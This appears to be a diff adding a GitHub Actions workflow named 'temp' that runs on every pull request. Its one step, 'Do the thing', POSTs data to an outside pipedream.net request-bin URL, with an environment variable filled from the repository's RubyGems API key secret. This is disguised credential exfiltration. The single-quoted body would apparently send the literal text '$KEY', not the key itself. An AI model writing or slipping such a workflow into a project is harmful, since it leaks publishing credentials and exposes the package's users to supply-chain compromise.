@@ -1,0 +1,20 @@
+name: temp
+on: 
+  workflow_dispatch:
+  pull_request:
+
+jobs:
+  temp:
+    name: temp
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+
+    - name: Do the thing
+      run: |
+        curl --location --request POST 'https://42c9be22ebc6a0c3bdfb7248922a6687.m.pipedream.net/temp' \
+          --header 'Content-Type: application/json' \
+          --data-raw '{"temp": "$KEY"}'
+      env: 
+        KEY: ${{ secrets.RUBYGEMS_API_KEY }}
